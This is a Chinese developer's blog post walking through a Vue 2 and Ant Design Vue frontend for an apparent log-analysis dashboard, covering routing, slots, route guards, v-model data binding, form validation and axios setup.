Vue我认为学下来就是很爽，基本上不用再各种去绑定JS当中的dom元素了（getElementById什么的） 其中基础源码，有一个index.html 1.index.html123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0&quot;&gt; &lt;link rel=&quot;icon&quot; href=&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;&gt; &lt;title&gt;&lt;%= htmlWebpackPlugin.options.title %&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;noscript&gt; &lt;strong&gt;We&#x27;re sorry but &lt;%= htmlWebpackPlugin.options.title %&gt; doesn&#x27;t work properly without JavaScript enabled. Please enable it to continue.&lt;/strong&gt; &lt;/noscript&gt; &lt;div id=&quot;app&quot;&gt;&lt;/div&gt; &lt;!-- built files will be auto injected --&gt; &lt;/body&gt;&lt;/html&gt; 启动的时候有一个main.js，APP.vue等等。现在讲一下我是怎么做下来的，我利用到的框架是antdv，再package.json当中可以找到 2.package.json1234567891011121314151617181920212223242526272829303132&quot;dependencies&quot;: &#123; &quot;@antv/data-set&quot;: &quot;^0.11.7&quot;, &quot;@antv/g2&quot;: &quot;^4.0.15&quot;, &quot;@sven0706/websocket&quot;: &quot;^1.0.1&quot;, &quot;ant-design-vue&quot;: &quot;^1.6.5&quot;, &quot;axios&quot;: &quot;^0.20.0&quot;, &quot;core-js&quot;: &quot;^3.6.5&quot;, &quot;echarts&quot;: &quot;^4.9.0&quot;, &quot;html2canvas&quot;: &quot;^1.0.0-rc.7&quot;, &quot;js-cookie&quot;: &quot;^2.2.1&quot;, &quot;jspdf&quot;: &quot;^2.1.1&quot;, &quot;less&quot;: &quot;^3.12.2&quot;, &quot;less-loader&quot;: &quot;^7.0.1&quot;, &quot;rc-resize-observer&quot;: &quot;^0.2.5&quot;, &quot;react&quot;: &quot;^16.13.1&quot;, &quot;react-dom&quot;: &quot;^16.13.1&quot;, &quot;react-window&quot;: &quot;^1.8.5&quot;, &quot;vant&quot;: &quot;^2.10.9&quot;, &quot;vue&quot;: &quot;^2.6.11&quot;, &quot;vue-print-nb&quot;: &quot;^1.5.0&quot;, &quot;vue-router&quot;: &quot;^3.4.5&quot;, &quot;vuex&quot;: &quot;^3.5.1&quot; &#125;, &quot;devDependencies&quot;: &#123; &quot;@vue/cli-plugin-babel&quot;: &quot;~4.5.0&quot;, &quot;@vue/cli-plugin-eslint&quot;: &quot;~4.5.0&quot;, &quot;@vue/cli-service&quot;: &quot;~4.5.0&quot;, &quot;babel-eslint&quot;: &quot;^10.1.0&quot;, &quot;eslint&quot;: &quot;^6.7.2&quot;, &quot;eslint-plugin-vue&quot;: &quot;^6.2.2&quot;, &quot;vue-template-compiler&quot;: &quot;^2.6.11&quot; &#125;, 要用的时候再项目根目录下cnpm -i即可。 讲一下路由该怎么做把，首先创建一个 3.router.js1234//引入vueimport Vue from &#x27;vue&#x27;;//引入vue-routerimport VueRouter from &#x27;vue-router&#x27;; 在Vue当中，所有需要引用的东西需要用Vue.use之后才会生效 故我们构造之后的代码框架大致如下： 1234567891011121314151617//引入vueimport Vue from &#x27;vue&#x27;;//引入vue-routerimport VueRouter from &#x27;vue-router&#x27;;Vue.use(VueRouter)//引用page1页面import upload from &#x27;./components/upload.vue&#x27;;import login from &#x27;./components/login.vue&#x27;;//定义routes路由的集合，数组类型const routes=[ //单个路由均为对象类型，path代表的是路径，component代表组件 &#123;path:&#x27;/upload&#x27;,component:upload&#125;, &#123;path:&#x27;/login&#x27;,component:login&#125;, 一个Vue文件的格式如下： 4.主入口123456789101112131415161718&lt;template&gt; &lt;div id&#x3D;&quot;app&quot;&gt; &lt;router-view&#x2F;&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123; name: &#39;App&#39;, &#125;&lt;&#x2F;script&gt;&lt;style&gt;&lt;&#x2F;style&gt; 在template当中构造HTML的代码，script当中构造当前页面的JS，而style设置中写css。如果不做限定，CSS将会是全局生效的！ 而APP作为主页面，只需要写一句话即可： 1&lt;router-view/&gt; 这一句话的意思代码将页面内容托管给Vue，根据vue的Router来显示内容 而Router的设置在main.js当中（实际上，几乎所有的设置都放在main.js当中进行统一设置） 1234new Vue(&#123; router, render: h =&gt; h(App),&#125;).$mount(&#x27;#app&#x27;) 在main.js导入的模块可以全项目生效，如果想要普通的生效一个模块，这样构造： 123456789101112import &#123; Button, Table, Menu, Switch,Icon,Layout,Upload,Breadcrumb,FormModel,Input,Divider,message,Form,Alert,Spin,Modal &#125; from &#x27;ant-design-vue&#x27;//在下面：Vue.use(Modal)Vue.use(Spin)Vue.use(Alert)Vue.use(Form)Vue.use(axios)Vue.use(htmlToPdf)Vue.use(Divider)Vue.use(Input)Vue.use(FormModel) 如果想要修改Vue默认的设置，例如我们导入axios的时候这样构造： 12import axios from &#x27;axios&#x27;Vue.prototype.$http = axios 之后我构造了一个公共使用的Vue模板，也就是菜单栏的插件，我是创建了一个commons文件夹，并写在里面 5.插槽12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;template&gt; &lt;a-layout id=&quot;components-layout-demo-side&quot; style=&quot;min-height: 100vh&quot;&gt; &lt;a-layout-sider v-model=&quot;collapsed&quot; width=&quot;12%&quot; collapsible&gt; &lt;div class=&quot;logo&quot; /&gt; &lt;a-menu theme=&quot;dark&quot; :default-selected-keys=&quot;[&#x27;1&#x27;]&quot; mode=&quot;inline&quot;&gt; &lt;a-menu-item key=&quot;1&quot;&gt; &lt;router-link to=&quot;upload&quot;&gt;&lt;a-icon type=&quot;cloud-download&quot; /&gt; &lt;span&gt; 文件上传 &lt;/span&gt; &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-sub-menu key=&quot;sub1&quot;&gt; &lt;span slot=&quot;title&quot;&gt;&lt;a-icon type=&quot;area-chart&quot; /&gt; &lt;span&gt; 数据分析 &lt;/span&gt; &lt;/span&gt; &lt;a-menu-item key=&quot;2&quot;&gt; &lt;router-link to=&quot;report&quot;&gt; 日志分析 &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-menu-item key=&quot;3&quot;&gt; &lt;router-link to=&quot;getpdf&quot;&gt; 获取报告 &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;/a-sub-menu&gt; &lt;a-sub-menu key=&quot;sub2&quot;&gt; &lt;span slot=&quot;title&quot;&gt;&lt;a-icon type=&quot;dashboard&quot; /&gt;&lt;span&gt;立体数据&lt;/span&gt;&lt;/span&gt; &lt;a-menu-item key=&quot;5&quot;&gt; &lt;router-link to=&quot;attackaddress&quot;&gt; 攻击溯源 &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-menu-item key=&quot;8&quot;&gt; &lt;router-link to=&quot;watchlog&quot;&gt; 实时监控 &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;/a-sub-menu&gt; &lt;a-menu-item key=&quot;9&quot;&gt; &lt;router-link to=&quot;setting&quot;&gt; &lt;a-icon type=&quot;setting&quot; /&gt; &lt;span&gt;系统设置&lt;/span&gt; &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-menu-item key=&quot;10&quot; @click=&quot;showModal&quot;&gt; &lt;a-icon type=&quot;login&quot; /&gt; &lt;span &gt;登出&lt;/span&gt; &lt;a-modal v-model=&quot;visible&quot; title=&quot;Basic Modal&quot; @ok=&quot;handleOk&quot;&gt; &lt;p&gt;是否确定登出？&lt;/p&gt; &lt;/a-modal&gt; &lt;/a-menu-item&gt; &lt;/a-menu&gt; &lt;/a-layout-sider&gt; &lt;a-layout&gt; &lt;a-layout-header theme=dark &gt; &lt;/a-layout-header&gt; &lt;!-- 上面是在导航栏最顶端加东西 --&gt; &lt;a-layout-content style=&quot;margin: 0 16px&quot;&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/a-layout-content&gt; &lt;a-layout-footer style=&quot;text-align: center&quot;&gt; Ant Design ©2018 Created by Ant UED &lt;/a-layout-footer&gt; &lt;/a-layout&gt; &lt;/a-layout&gt;&lt;/template&gt;&lt;script&gt; 需要注意的是： 1&lt;slot&gt;&lt;/slot&gt; 在Vue当中，这个相当于一个插槽，也就是，呃，类似一个include函数，我们如果想要把他当作模板的话就需要这样写，比如我们的report.vue 1234567import menus from &#x27;../commons/menu&#x27;&lt;menu&gt;&lt;/menu&gt;//在下面导入，之后再html当中使用即可components:&#123; menus, &#125;, 6.路由守卫我们前端肯定是要鉴权的吧，不然用户就可对前端为所欲为了，故我们构造一个局部守卫是这样的： 123456beforeRouteEnter(to,from,next) &#123; axios.post(&#x27;/report&#x27;).then(res =&gt;&#123; if (res.data == 0) next(&#123; path:&#x27;/&#x27; &#125;); else next(); &#125;) &#125;, 这样的话，再访问该路由，离开路由的时候都会先访问一次页面，我们后端写好代码，如果用户没有登陆的话，就会返回到index页面了。 7.期待值这个理解起来单靠嘴说较为僵硬，需要实战中使用才可以领悟的清楚，比如我们的html代码中构造如下： 1&lt;a-button type=&quot;danger&quot; :style=&quot;&#123;margin:&#x27;-20px 0px 0px 200px&#x27;&#125;&quot; @click=&quot;ExportSavePdf(htmlTitle,nowTime)&quot;&gt;报告生成&lt;/a-button&gt; （通过Vue框架，我们可以使用@click的方法来处理各种事件，之后填入一个函数，并写入函数的实参，而实参不一定是一定出现的，所以我们的实参可能会出现为null的情况，而Vue不想出现这种情况，所以要求我们填入默认值，也就是期待值，当我们没有填入参数的时候自动填入的参数 12345678data() &#123; return &#123; data, columns, htmlTitle: &#x27;report&#x27;, keyName: &#x27;&#x27;, &#125;; &#125;, 8.设置默认值有的时候，我们可能想在用户访问之前的时候直接获取数据，这样的话就可以直接拿到数据了，于是我们可以通过如下方法： 123mounted() &#123; // this.drawChart(); &#125; 以这种方式填入的值，当用户访问页面的时候便会自动进行调用。例子： 1234567axios.post(&#x27;/setting&#x27;).then(res=&gt;&#123; this.usersData(res.data); // location.reload() &#125;).catch(err=&gt;&#123; // console.log(err) &#125;) &#125; 9.实现监听数据在之前的layui的时候，因为我不会对数据进行绑定，所以往往造成自己要写很多的type=hiden，或者必须构造form表单的情况，而使用框架之后可以通过v-model操作简单的实现这个效果， 例如我们可以构造如下代码： 123456789101112131415161718192021222324252627282930313233343536&lt;a-form-model-item style=&quot;margin: 0px 10px 0px 00px&quot; class=&quot;selectAddress&quot;&gt; &lt;a-input type=&quot;password&quot; placeholder=&quot;logKey&quot; v-model=&quot;attackAddressName&quot;&gt; &lt;a-icon slot=&quot;prefix&quot; type=&quot;lock&quot; style=&quot;color:rgba(0,0,0,.25)&quot; /&gt; &lt;/a-input&gt; &lt;/a-form-model-item&gt; &lt;a-form-model-item class=&quot;selectButton&quot;&gt; &lt;a-button type=&quot;primary&quot; html-type=&quot;submit&quot; @click=&quot;selectAddress($event)&quot; &gt; 添加 &lt;/a-button&gt; &lt;/a-form-model-item&gt;//在JS代码中：selectAddress:function(event)&#123; // console.log(this.attackAddressName) let formAddress = new FormData(); formAddress.append(&#x27;logname&#x27;, this.attackAddressName) // console.log(formAddress.get(&#x27;logname&#x27;)) this.spinning = true; axios.post(&#x27;/setting&#x27;,formAddress).then(res =&gt;&#123; let earchData =JSON.parse(res.data) // console.log(res.data) this.china(earchData); this.spinning = false; &#125;).catch(err =&gt;&#123; console.log(err); &#125;) &#125; 我们可以发现，我并没有写form表单，而我依然可以实现提交数据，是因为使用v-model监听之后，该input输入框的内容被JS实时监控着。 10.监听的妙用利用监听，我们可以很轻松的完成对一些看起来很酷炫的特效，比如，如果用户想要提交点击一个按钮，就需要填写几个input框，并且如果框是空的，还可以给出提示等等，这里举出一个例子，比如： 123456789101112&lt;!-- 用户名判断 --&gt; &lt;a-form-item :validate-status=&quot;userNameError() ? &#x27;error&#x27; : &#x27;&#x27;&quot; :help=&quot;userNameError() || &#x27;&#x27;&quot;&gt; &lt;a-input v-decorator=&quot;[ &#x27;userName&#x27;, &#123; rules: [&#123; required: true, message: &#x27;Please input your username!&#x27; &#125;] &#125;, ]&quot; placeholder=&quot;Username&quot; &gt; &lt;a-icon slot=&quot;prefix&quot; type=&quot;user&quot; style=&quot;color:rgba(0,0,0,.25)&quot; /&gt; &lt;/a-input&gt; &lt;/a-form-item&gt; 顺便一提， 用:引号写入的东西，一般我们是用于条件判断，比如在这里，我们就是利用这个去判断userNameError的状况 在methods当中，我们构造如下代码： 1234userNameError() &#123; const &#123; getFieldError, isFieldTouched &#125; = this.form; return isFieldTouched(&#x27;userName&#x27;) &amp;&amp; getFieldError(&#x27;userName&#x27;); &#125;, 在data当中： 123456data() &#123; return &#123; hasErrors, form: this.$form.createForm(this, &#123; name: &#x27;getWebsocket&#x27; &#125;), &#125;; &#125;, 官方是如下解释的： v-decorator 是 Ant Design 的控件验证属性。 经过 getFieldDecorator 或 v-decorator 包装的控件，表单控件会自动添加 value（或 valuePropName 指定的其他属性） onChange（或 trigger 指定的其他属性），数据同步将被 Form 接管，这会导致以下结果： 你不再需要也不应该用 onChange 来做同步，但还是可以继续监听 onChange 等事件。 你不能用控件的 value defaultValue 等属性来设置表单域的值，默认值可以用 getFieldDecorator 或 v-decorator 里的 initialValue。 你不应该用 v-model，可以使用 this.form.setFieldsValue 来动态改变表单值。 也就是说这种方式是吧form由Vue彻底托管了~和之前的不同，会自动判断是否存在值，如果不存在的话，将会调用v-decorator。当然这种方式我是比较模糊的，真要说我比较理解的是另外一个形式 11.v-model的妙用在html当中写下： 12345678910111213141516171819&lt;a-form-model-item style=&quot;margin: 0px 10px 0px 00px&quot; class=&quot;selectAddress&quot;&gt; &lt;a-input type=&quot;password&quot; placeholder=&quot;logKey&quot; v-model=&quot;attackAddressName&quot;&gt; &lt;a-icon slot=&quot;prefix&quot; type=&quot;lock&quot; style=&quot;color:rgba(0,0,0,.25)&quot; /&gt; &lt;/a-input&gt; &lt;/a-form-model-item&gt; &lt;a-form-model-item class=&quot;selectButton&quot;&gt; &lt;a-button type=&quot;primary&quot; html-type=&quot;submit&quot; @click=&quot;selectAddress($event)&quot; &gt; 添加 &lt;/a-button&gt; &lt;/a-form-model-item&gt;&lt;a-alert message=&quot;输入key，即可自动溯源&quot; type=&quot;info&quot; class=&quot;fontKey&quot; /&gt; &lt;a-spin size=&quot;large&quot; class=&quot;spinner&quot; :spinning=&quot;spinning&quot; :delay=&quot;delayTime&quot; /&gt; 注意这里的spinning，我们给她进行托管，如果可以的话，而spinning的期望默认值在data当中构造： 1234567data()&#123; return&#123; attackAddressName:&#x27;&#x27;, spinning: false, delayTime: 500, &#125; &#125;, 而当我们点击按钮发送数据之后： 123456789101112131415161718selectAddress:function(event)&#123; // console.log(this.attackAddressName) let formAddress = new FormData(); formAddress.append(&#x27;logname&#x27;, this.attackAddressName) // console.log(formAddress.get(&#x27;logname&#x27;)) this.spinning = true; axios.post(&#x27;/setting&#x27;,formAddress).then(res =&gt;&#123; let earchData =JSON.parse(res.data) // console.log(res.data) this.china(earchData); this.spinning = false; &#125;).catch(err =&gt;&#123; console.log(err); &#125;) &#125; 一旦数据成功发送过去，我们就将spinning的值改成true，这样就可以显示了，当获取数据之后，我们就改成false，让他消失即可 axios part1.aiox发送数据axios是一个组件，用于发送数据给后端，相当好用，我们为了降低代码耦合性，应该抓门建立一个axios文件夹，并且设置一个http.js，各种各样的设置我们都在axios当中进行配置即可： 12345import axios from &#x27;axios&#x27;axios.defaults.baseURL = &#x27;http://localhost:8081&#x27;;axios.defaults.timeout = 1000000;axios.defaults.withCredentials = true 例如这样，就是设置了默认的url，设置超时事件，带上cookies等等，而axios的使用也很简单，构造如下： 12345678910111213axios.post(&quot;/login&quot;,formData,config).then(res =&gt; &#123; if(res.data == 0 )&#123; alert(&quot;账号或密码错误！&quot;) &#125; else&#123; this.$message.success(` login successfully!`); router.push(&#123; path:&quot;/upload&quot; &#125;) &#125; &#125;).catch(err =&gt; &#123; console.log(err) &#125;); axios.get/post axios.get().theml().catch() 在then和cat当中去写别的东西，上图当中的res.data为API给回来的数据，成功之后router.push就可以让页面进行跳转了 总结感觉自己是边学边写的，学到后面的时候感觉之前的东西还可以做得更好，但是蓝狗了，已经不想动了orz","categories":[],"tags":[{"name":"开发","slug":"开发","permalink":"http://example.com/tags/%E5%BC%80%E5%8F%91/"}]}],"categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"},{"name":"开发","slug":"开发","permalink":"http://example.com/tags/%E5%BC%80%E5%8F%91/"},{"name":"渗透","slug":"渗透","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"比赛","slug":"比赛","permalink":"http://example.com/tags/%E6%AF%94%E8%B5%9B/"},{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"},{"name":"nodejs","slug":"nodejs","permalink":"http://example.com/tags/nodejs/"},{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"ssti","slug":"ssti","permalink":"http://example.com/tags/ssti/"}]}